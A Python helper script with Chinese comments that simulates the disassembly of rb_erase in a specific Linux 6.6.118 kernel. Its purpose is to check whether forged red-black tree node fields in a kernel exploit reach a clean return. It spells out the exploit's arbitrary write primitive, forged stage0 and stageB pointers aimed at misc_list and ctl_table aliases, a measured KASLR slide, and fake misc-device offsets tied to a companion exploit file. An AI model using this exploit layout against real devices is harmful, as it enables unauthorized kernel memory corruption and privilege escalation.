#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
H12: rb_erase 几何模拟器
用 MEY (kernel 6.6.118) 的真实反汇编逐条模拟，判定给定 (pc, right, left) 走哪条路径。
反汇编来源: analysis/output/disasm_walk.txt (rb_erase @ 0xffffffc08003a9d4)

Linux 6.6 rb_erase 源码对照 (lib/rbtree.c):
  void rb_erase(struct rb_node *node, struct rb_root *root)
  {
      struct rb_node *rebalance;
      rebalance = __rb_erase_augmented(node, root, &dummy_callbacks);
      if (rebalance)
          ____rb_erase_color(rebalance, root, dummy_rotate);
  }

  __rb_erase_augmented 核心（无 augment 回调时退化为标准 rb_erase）:
      child = node->rb_right;
      tmp   = node->rb_left;
      if (!tmp) {                       // 情况: 无左孩子
          parent = rb_parent(node);
          pc = rb_parent_color(node);
          if (!child) {                 // 无任何孩子 -> 需要 rebalance
              if (!parent) { root->rb_node = NULL; return NULL; }
              ...
              return parent;            // <- rebalance != NULL
          }
          // 单子节点(right 有 child): 
          ...
      }
  """
import sys

# ---- 反汇编中出现的指令序列（rb_erase 入口部分，逐条表）----
CODE = [
    (0x3a9d4, "ldp x8,x10,[x0,#8]",  "x8=node->left  x10=node->right"),   # x8=left, x10=right
    (0x3a9d8, "cbnz x10, +0x40",     "right!=0 -> 0x3aa18"),
    # ---- right == 0 分支 ----
    (0x3a9dc, "ldr x9,[x0]",         "x9=node->parent_color"),
    (0x3a9e0, "mov x11,x1",          "x11=root"),
    (0x3a9e4, "ands x10,x9,#-4",     "x10=parent(!=0?)"),
    (0x3a9e8, "b.eq 0x3aa00",        "parent==0 -> 0x3aa00"),
    (0x3a9ec, "mov x11,x10",         ""),
    (0x3a9f0, "ldr x12,[x11,#0x10]!", "x12=parent->left; x11=parent+0x10"),
    (0x3a9f4, "sub x13,x11,#8",      "x13=parent+8"),
    (0x3a9f8, "cmp x12,x0",          "parent->left==node?"),
    (0x3a9fc, "csel x11,x11,x13,eq", "x11= node==left ? parent+0x10 : parent+8"),
    (0x3aa00, "str x8,[x11]",        "*(x11)=left(0)  <- 摘链"),
    (0x3aa04, "cbnz x8,0x3aa10",     "left!=0 -> 0x3aa10"),
    (0x3aa08, "tbnz w9,#0,0x3aa78",  "color(RED?) -> 0x3aa78"),
    (0x3aa0c, "ret",                 "★ 安全返回"),
    (0x3aa10, "str x9,[x8]",         "left->pc = node->pc"),
    (0x3aa14, "ret",                 "★ 安全返回"),
    # ---- right != 0 分支 ----
    (0x3aa18, "cbz x8, 0x3ab04",     "left==0 -> 0x3ab04  ★★★ 我们的几何"),
]

# ---- 0x3ab04 子路径: right!=0 && left==0 ----
PATH_AB04 = [
    (0x3ab04, "ldr x9,[x0]",         "x9=node->parent_color"),
    (0x3ab08, "ands x8,x9,#-4",      "x8=parent; 设 ZF=(parent==0)"),
    (0x3ab0c, "str x9,[x10]",        "★★★ 写原语: *right = node->parent_color"),
    (0x3ab10, "b.eq 0x3ac0c",        "parent==0 -> 0x3ac0c"),
    (0x3ab14, "ldr x9,[x8,#0x10]",   "x9=parent->left"),
    (0x3ab18, "cmp x9,x0",           "parent->left == node ?"),
    (0x3ab1c, "b.ne 0x3ac8c",        "★ 不等 -> 0x3ac8c"),
    (0x3ab20, "str x10,[x8,#0x10]",  "parent->left = right"),
    (0x3ab24, "ret",                 "★ 安全返回（唯一干净出口）"),
]

def sim(pc, right, left):
    """返回 (path, outcome, notes)"""
    notes = []
    # 入口
    if right != 0:
        if left == 0:
            path = "right!=0 & left==0  (0x3ab04)"
        else:
            path = "right!=0 & left!=0  (0x3ab7c, 后继/双子)"
            return path, "UNANALYZED", ["进入后继查找分支"]
    else:
        path = "right==0  (0x3a9dc)"
        if pc & 3:  # parent!=0 (低2位含颜色)
            parent = pc & ~3
            notes.append("parent=%#x" % parent)
            notes.append("摘链目标 x11 = %#x" % (parent + (0x10 if (left == 0) else 8)))
        else:
            notes.append("parent==0 -> 0x3aa00 用 root")
        if left != 0:
            notes.append("left!=0 -> 0x3aa10 写 left->pc 后 ret")
            return path, "SAFE_RET", notes
        if pc & 1:
            notes.append("RED -> 0x3aa78 进入 rebalance")
            return path, "REBALANCE", notes
        return path, "SAFE_RET", notes

    # 0x3ab04 子路径
    parent = pc & ~3
    notes.append("forged field: pc=%#x  right(target)=%#x  left=%#x" % (pc, right, left))
    notes.append("写原语: *[%#x] = %#x  (%s)" % (right, pc,
                 "含颜色位|1, 奇数指针!" if (pc & 1) else "BLACK 干净"))
    if parent == 0:
        notes.append("parent==0 -> 0x3ac0c: *root = right; ret")
        return path, "SAFE_RET_root", notes
    notes.append("parent(mapped)=%#x ; 读 parent->left, 与 node 比较 -> 0x3ab1c" % parent)
    notes.append("若 parent->left != node => 0x3ac8c: parent->right = right; ret")
    notes.append("若 parent->left == node => 0x3ab20: parent->left = right; ret")
    # 两条都 ret, 关键差异在 0x3ac8c 写的是 parent+8 而非 parent+0x10
    return path, "SAFE_RET_*", notes

def main():
    print("=" * 78)
    print("H12 rb_erase 几何模拟 —— MEY kernel 6.6.118 真反汇编")
    print("=" * 78)

    # ---- 常量（与 f77.c 一致；slide=0x22c8c00000 实测命中值）----
    LINK_IMAGE_BASE = 0xffffffc080000000
    LINK_MISC_LIST  = 0xffffffc08229b190
    MEY_PHYS_DELTA  = 0x28000000
    DIRECT_MAP_BEGIN = LINK_IMAGE_BASE + MEY_PHYS_DELTA          # physmap 起点（近似）
    FAKE_MISC_OFF   = 0x100
    FAKE_MISC_LIST_OFF = 0x18

    # stage0 实测：forged_parent 指向 P0alias(ctl_table[boot_id]) - 8
    s0_pc = 0xffffff802a29b088            # = 0xffffff802a29b090 - 8，偶数 => BLACK
    s0_right = 0xffffff802a17d5d0         # = P0alias(cycle_c)

    # stageB physmap 别名: P0alias(misc_list) - 8
    sb_phys = DIRECT_MAP_BEGIN + (LINK_MISC_LIST - LINK_IMAGE_BASE) + MEY_PHYS_DELTA - 8
    # stageB image 域:  LINK_MISC_LIST + slide - 8   (slide 取 0x22c8c00000)
    slide = 0x22c8c00000
    sb_img = LINK_MISC_LIST + slide - 8
    # stageB 的 rb_right = forged_child = base + 0x100 + 0*0x58 + 0x18
    sb_child = 0xffffff8040000000 + FAKE_MISC_OFF + FAKE_MISC_LIST_OFF   # base 示例

    scenarios = [
        ("stage0  fragment", s0_pc, s0_right, 0x0),
        ("stageB  physmap",  sb_phys, sb_child, 0x0),
        ("stageB  image_va", sb_img, sb_child, 0x0),
        ("假设 |1 染红",     s0_pc | 1, s0_right, 0x0),
    ]
    print("[calib] sb_phys=%#x  sb_img=%#x  (delta=%#x)" % (sb_phys, sb_img, sb_phys - sb_img))
    for name, pc, right, left in scenarios:
        path, outcome, notes = sim(pc, right, left)
        print("\n[%s]" % name)
        print("  路径: %s" % path)
        print("  结局: %s" % outcome)
        for n in notes:
            print("    - %s" % n)

    print("\n" + "=" * 78)
    print("结论：")
    print("  1) rb_left=0 & rb_right!=0 & parent!=0 时，rb_erase 走 0x3ab04 子路径，")
    print("     写原语在 0x3ab0c 执行，之后 0x3ab20 或 0x3ac8c 都是 ret —— 两出口均安全。")
    print("  2) 颜色位 |1 会污染写入值：*right = (pc|1) 为奇数 => 后续内核解引用奇数指针 => panic。")
    print("  3) 因此判断：当前几何【不应该崩】。崩溃必来自别处（见阶段二其余假设）。")
    print("=" * 78)

if __name__ == "__main__":
    main()
